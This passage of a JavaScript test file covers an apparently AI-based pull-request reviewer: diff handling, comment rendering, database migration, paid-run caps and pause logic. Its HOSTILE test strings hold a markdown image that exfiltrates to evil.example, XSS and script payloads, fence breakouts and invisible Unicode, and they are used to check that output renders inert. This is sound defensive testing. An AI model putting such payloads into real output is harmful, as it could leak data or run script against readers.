  const many = Array.from({ length: 70 }, (_, i) => changed(`test/${i}.js`));
  const listed = pre(many).attention;
  assert.equal(listed.length, 51);
  assert.equal(listed.at(-1), 'and 20 more');
});

test('pre-checks: too large is decided before any spend, and reaching the limit counts', () => {
  const big = (n) => Array.from({ length: n }, (_, i) => changed(`src/${i}.js`));
  assert.equal(pre(big(LIMITS.files - 1)).tooLarge, false);
  assert.equal(pre(big(LIMITS.files)).tooLarge, true);
  assert.equal(pre(big(1), { truncated: true }).tooLarge, true);
  assert.equal(pre([changed('a.js', 'y'.repeat(LIMITS.diffBytes))]).tooLarge, true);
  assert.equal(pre([changed('a.js', 'y'.repeat(1000))]).tooLarge, false);
});

test('the diff input keeps every changed file visible, including one with nothing to show', () => {
  const text = diffText([changed('src/a.js'), unshown('tool.bin'), changed('b.js', 'y', { previous_filename: 'old.js' }), changed('CLAUDE.md', 'obey')]);
  assert.match(text, /\+\+\+ src\/a\.js\n@@/);
  assert.match(text, /\+\+\+ tool\.bin\n\(GitHub did not show this file\)/);
  assert.match(text, /--- old\.js\n\+\+\+ b\.js/);
  assert.match(text, /\+obey/, 'a change to a file the cleaning step drops is still there to read');
});

test('addedLines still lives where the mock review exports it from', () => {
  assert.deepEqual(addedLines('@@ -1 +1,2 @@\n x\n+y'), [{ line: 2, text: 'y' }]);
});

// --- the comment ------------------------------------------------------------

const job = { pr: 4, sha: SHA, meta: {} };
const passed = normalize({ state: 'success', summary: 'passed' }, 'test');

// The text of a comment outside its code blocks, and the blocks themselves. A line that merely starts like a fence but is not one of
// ours fails here, because that is how a code block gets broken out of.
function split(body) {
  const outside = [];
  const blocks = [];
  let block = null;
  for (const line of body.split('\n')) {
    if (line === '```') {
      if (block) {
        blocks.push(block);
        block = null;
      } else block = [];
      continue;
    }
    assert.ok(!line.trimStart().startsWith('```'), `a line that could open or close a block: ${line.slice(0, 60)}`);
    (block ?? outside).push(line);
  }
  assert.equal(block, null, 'every code block is closed');
  return { outside: outside.join('\n'), blocks };
}

const HOSTILE = [
  '![leak](http://evil.example/?data=1)',
  '[click here](http://evil.example/)',
  '<img src=x onerror=alert(1)>',
  '</details><script>alert(1)</script>',
  '```\n# injected heading\n```',
  '``\u200B` closes? no',
  '@admin and @everyone',
  '| a | table |',
  '\u202Ereversed\u202C',
  'tag\u{E0041}chars',
  'line\u2028separator\u2029here',
  'esc\u001b[31m',
].join(' ');

test('hostile finding text renders inert: inside a code block, on one line, with nothing that can act', () => {
  const review = normalize({ state: 'failure', summary: '1 blocking finding(s)', reviewer: 'r', findings: [
    { file: 'src/a.js', line: 3, severity: 'blocker', message: HOSTILE },
    { file: '![x](http://evil.example/f).js', line: 1, severity: 'blocker', message: 'plain' },
    { file: null, line: null, severity: '```\n# heading', message: 'odd severity' },
  ] }, 'review');
  const body = renderComment(job, passed, review);
  const { outside, blocks } = split(body);
  for (const bad of ['![', '](', '<img', '<script', 'evil.example', '@admin', '@everyone', '# injected', '# heading', 'alert']) {
    assert.ok(!outside.includes(bad), `outside a block: ${bad}`);
  }
  assert.equal(blocks.length, 1);
  const [lines] = blocks;
  assert.equal(lines.length, 3, 'one line per finding, whatever the text holds');
  const text = lines.join('\n');
  assert.ok(text.includes('![leak]'), 'the words are still there to read');
  assert.ok(!/```/.test(text));
  assert.ok(!/@(admin|everyone)/.test(text), 'mentions are broken');
  assert.ok(!/[\u202A-\u202E\u2066-\u2069\u2028\u2029\u{E0000}-\u{E007F}\u001b]/u.test(text), 'nothing invisible or out of place');
});

test('the same goes for the read-yourself list, whose names a PR chooses', () => {
  const review = normalize({ state: 'error', summary: 's', attention: ['test/![x](http://evil.example/).js', '@admin.test.js', '```\n# heading'], advisory: true }, 'review');
  const body = renderComment(job, passed, review);
  const { outside, blocks } = split(body);
  assert.match(outside, /\*\*Read these yourself\*\*/);
  assert.match(outside, /Advisory only/);
  for (const bad of ['![', 'evil.example', '@admin', '# heading']) assert.ok(!outside.includes(bad), bad);
  assert.equal(blocks[0].length, 3);
});

test('hostile test output still cannot escape, next to findings in their own block', () => {
  const tests = normalize({ state: 'failure', summary: 'failed', log: 'x\n```\n![leak](http://evil.example/)' }, 'test');
  const review = normalize({ state: 'error', summary: 's', findings: [{ severity: 'minor', message: 'a' }] }, 'review');
  const { outside, blocks } = split(renderComment(job, tests, review));
  assert.equal(blocks.length, 2);
  assert.ok(!outside.includes('evil.example'));
});

test('without a review\'s extras the comment has no extra sections: the mock\'s comment gains only its code block', () => {
  const review = normalize({ state: 'success', summary: 'No blocking findings', findings: [], reviewer: 'mock-v1' }, 'review');
  const body = renderComment(job, passed, review);
  assert.ok(!body.includes('```'));
  assert.ok(!body.includes('Read these yourself'));
  assert.ok(!body.includes('Advisory'));
});

// --- the database -----------------------------------------------------------

// The schema as it is on a live reviewer.db from before these tables existed.
const TODAY = `
  CREATE TABLE jobs (
    pr INTEGER NOT NULL, sha TEXT NOT NULL, meta TEXT NOT NULL, state TEXT NOT NULL DEFAULT 'queued',
    attempts INTEGER NOT NULL DEFAULT 0, next_attempt_at INTEGER NOT NULL DEFAULT 0, result TEXT, last_error TEXT,
    created_at INTEGER NOT NULL, PRIMARY KEY (pr, sha)
  );
  CREATE TABLE prs (pr INTEGER PRIMARY KEY, comment_id INTEGER);
  CREATE TABLE task_results (
    result_id TEXT PRIMARY KEY, task_id TEXT NOT NULL, pr INTEGER NOT NULL, sha TEXT NOT NULL, payload TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending', attempts INTEGER NOT NULL DEFAULT 0, next_attempt_at INTEGER NOT NULL DEFAULT 0,
    last_error TEXT, created_at INTEGER NOT NULL
  );
  CREATE INDEX task_results_due ON task_results (status, next_attempt_at);
`;

function tempDb(t) {
  const dir = mkdtempSync(join(tmpdir(), 'adabra-review-db-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  return join(dir, 'reviewer.db');
}

test('migration: today\'s database gains two tables, loses nothing, and keeps working, however often it is opened', (t) => {
  const path = tempDb(t);
  const old = new DatabaseSync(path);
  old.exec(TODAY);
  old.prepare("INSERT INTO jobs (pr, sha, meta, state, attempts, result, created_at) VALUES (1, ?, '{\"branch\":\"b\"}', 'done', 2, '{\"tests\":\"success\",\"review\":\"success\"}', 5)").run(SHA);
  old.prepare("INSERT INTO jobs (pr, sha, meta, state, attempts, next_attempt_at, created_at) VALUES (2, ?, '{}', 'queued', 1, 7, 6)").run(SHA);
  old.prepare('INSERT INTO prs (pr, comment_id) VALUES (1, 99)').run();
  old.prepare("INSERT INTO task_results (result_id, task_id, pr, sha, payload, created_at) VALUES ('r-12345678', 'TASK-1', 1, ?, '{\"a\":1}', 5)").run(SHA);
  const columns = (db, table) => db.prepare(`SELECT name, type, "notnull", dflt_value, pk FROM pragma_table_info('${table}')`).all();
  const before = Object.fromEntries(['jobs', 'prs', 'task_results'].map((name) => [name, columns(old, name)]));
  old.close();

  for (let i = 0; i < 2; i++) {
    const store = new ReviewStore(path);
    assert.equal(store.getJob(1, SHA).state, 'done');
    assert.deepEqual(store.getJob(1, SHA).result, { tests: 'success', review: 'success' });
    assert.equal(store.getJob(2, SHA).attempts, 1);
    assert.equal(store.commentId(1), 99);
    assert.equal(store.getTaskResult('r-12345678').task_id, 'TASK-1');
    assert.equal(store.reviewPause(NOW), null);
    assert.equal(store.paidRunsOn(NOW), 0);
    assert.equal(store.next(10).pr, 2, 'the queue reads as before');
    for (const name of Object.keys(before)) assert.deepEqual(columns(store.db, name), before[name], `${name} is unchanged`);
    const tables = store.db.prepare("SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'").all().map((r) => r.name).sort();
    assert.deepEqual(tables, ['jobs', 'prs', 'review_pause', 'review_runs', 'task_results']);
    store.close();
  }

  // Old code keeps working on the upgraded file: nothing it reads or writes has moved.
  const after = new DatabaseSync(path);
  after.prepare("INSERT INTO jobs (pr, sha, meta, created_at) VALUES (3, ?, '{}', 8)").run(SHA);
  assert.equal(after.prepare('SELECT COUNT(*) AS n FROM jobs').get().n, 3);
  after.close();
});

test('the daily count is per UTC day, counts retries and crashes, and leaves out runs that never started', (t) => {
  const store = new ReviewStore(tempDb(t));
  t.after(() => store.close());
  const key = { pr: 1, sha: SHA, skill: 's', model: 'm' };
  const start = (now, cap = 3) => store.beginReviewRun({ ...key, now, cap });
  const lastSecond = Date.UTC(2026, 10, 2, 23, 59, 59);
  const a = start(lastSecond);
  assert.equal(store.paidRunsOn(lastSecond), 1, 'counted before it finishes, so a crash during the run still counts');
  store.finishReviewRun(a, { outcome: 'transient', now: lastSecond });
  assert.equal(store.paidRunsOn(lastSecond), 1, 'a failed run was still paid for');
  const notStarted = start(lastSecond);
  store.finishReviewRun(notStarted, { outcome: 'auth', paid: false, now: lastSecond });
  assert.equal(store.paidRunsOn(lastSecond), 1);
  start(lastSecond);
  start(lastSecond);
  assert.equal(store.paidRunsOn(lastSecond), 3);
  assert.equal(start(lastSecond), null, 'at the cap, nothing starts');
  assert.equal(store.paidRunsOn(lastSecond + 1000), 0, 'a new UTC day starts at zero');
  assert.notEqual(start(lastSecond + 1000), null);
  assert.equal(nextUtcMidnight(lastSecond), lastSecond + 1000);
  assert.equal(nextUtcMidnight(Date.UTC(2026, 11, 31, 5)), Date.UTC(2027, 0, 1), 'across a year');
});

test('a stored result is found by PR, commit, skill and model, and only a valid one', (t) => {
  const store = new ReviewStore(tempDb(t));
  t.after(() => store.close());
  const key = { pr: 1, sha: SHA, skill: 's', model: 'm' };
  const save = (k, outcome, result) => store.finishReviewRun(store.beginReviewRun({ ...k, now: NOW, cap: 99 }), { outcome, result, now: NOW });
  save(key, 'invalid', null);
  assert.equal(store.cachedReview(key), null, 'an invalid run stores nothing');
  save(key, 'valid', { state: 'failure', findings: [{ severity: 'blocker' }] });
  assert.equal(store.cachedReview(key).state, 'failure');
  assert.equal(store.cachedReview({ ...key, skill: 's2' }), null);
  assert.equal(store.cachedReview({ ...key, model: 'm2' }), null);
  assert.equal(store.cachedReview({ ...key, sha: 'b'.repeat(40) }), null);
  assert.equal(store.cachedReview({ ...key, pr: 2 }), null, 'another PR can have another base, so another diff');
  store.db.prepare("UPDATE review_runs SET result = '{\"state\":\"maybe\",\"findings\":[]}' WHERE outcome = 'valid'").run();
  assert.equal(store.cachedReview(key), null, 'a row that does not read as a verdict never becomes one');
  store.db.prepare("UPDATE review_runs SET result = 'not json' WHERE outcome = 'valid'").run();
  assert.equal(store.cachedReview(key), null);
});

test('the pause: doubling to a ceiling, a stated reset wins, and only a worked run or the operator ends it', (t) => {
  const store = new ReviewStore(tempDb(t));
  t.after(() => store.close());
  const HOUR = 3_600_000;
  assert.equal(store.reviewPause(NOW), null);
  const waits = [1, 2, 4, 6, 6].map((h) => {
    const until = store.pauseForLimit(NOW);
    assert.equal(until, NOW + h * HOUR);
    return until;
  });
  assert.equal(waits.length, 5);
  assert.deepEqual(store.reviewPause(NOW), { kind: 'limit', until: NOW + 6 * HOUR });
  assert.equal(store.reviewPause(NOW + 6 * HOUR), null, 'once it has passed, one job may try');
  assert.equal(store.pauseForLimit(NOW + 6 * HOUR), NOW + 12 * HOUR, 'and the back-off carries on if it still fails');
  assert.equal(store.pauseForLimit(NOW, NOW + 30 * HOUR), NOW + 30 * HOUR, 'a stated reset wins');
  store.reviewWorked();
  assert.equal(store.reviewPause(NOW), null);
  assert.equal(store.pauseForLimit(NOW), NOW + HOUR, 'back to the start after a run that worked');

  store.reviewWorked();
  store.pauseForAuth();
  assert.deepEqual(store.reviewPause(NOW + 100 * HOUR), { kind: 'auth', until: null }, 'no end time: it waits for the operator');
  assert.equal(store.clearAuthPause(), true);
  assert.equal(store.reviewPause(NOW), null);
  assert.equal(store.clearAuthPause(), false);
  store.pauseForLimit(NOW);
  assert.equal(store.clearAuthPause(), false, 'a restart does not lift a limit that still holds');
  assert.notEqual(store.reviewPause(NOW), null);
});

test('strikes count in a row and survive a pause, until something recognised happens', (t) => {
  const store = new ReviewStore(tempDb(t));
  t.after(() => store.close());
  assert.equal(store.addStrike(), 1);
  assert.equal(store.addStrike(), 2);
  store.clearStrikes();
  assert.equal(store.addStrike(), 1);
  assert.equal(store.addStrike(), 2);
  assert.equal(store.addStrike(), 3);
  store.pauseForLimit(NOW);
  assert.equal(store.addStrike(), 4);
  store.reviewWorked();
  assert.equal(store.addStrike(), 1);
});

test('holding a job gives the attempt back, and clearing a pause brings the waiting jobs forward', (t) => {
  const store = new ReviewStore(tempDb(t));
  t.after(() => store.close());
  store.enqueue(1, SHA, {}, 5);
  store.markRunning(1, SHA);
  assert.equal(store.getJob(1, SHA).attempts, 1);
  store.holdJob(1, SHA, 'why', NOW + 1000);
  const job = store.getJob(1, SHA);
  assert.deepEqual([job.state, job.attempts, job.next_attempt_at, job.last_error], ['queued', 0, NOW + 1000, 'why']);
  assert.equal(store.next(NOW), null);
  assert.equal(store.next(NOW + 1000).pr, 1);

  assert.equal(store.clearPause(), false);
  assert.equal(store.getJob(1, SHA).next_attempt_at, NOW + 1000, 'with no pause, clearing touches nothing');
  store.pauseForAuth();
  assert.equal(store.retry(1), true, 'the operator\'s retry lifts the pause');
  assert.equal(store.reviewPause(NOW), null);
  assert.equal(store.next(0).pr, 1);

  store.enqueue(2, SHA, {}, 6);
  store.holdJob(2, SHA, 'why', NOW + 5000);
  store.pauseForAuth();
  store.clearAuthPause();
  assert.equal(store.next(0).pr, 1);
  assert.equal(store.getJob(2, SHA).next_attempt_at, 0);
});

test('nothing about an existing table changes: the store only ever adds tables', () => {
  const text = readFileSync(new URL('../reviewer/store.js', import.meta.url), 'utf8');
  assert.ok(!/ALTER TABLE|DROP TABLE|DROP INDEX|DELETE FROM jobs/i.test(text), 'nothing about an existing table changes');
  assert.equal((text.match(/CREATE TABLE IF NOT EXISTS/g) ?? []).length, 5);
});
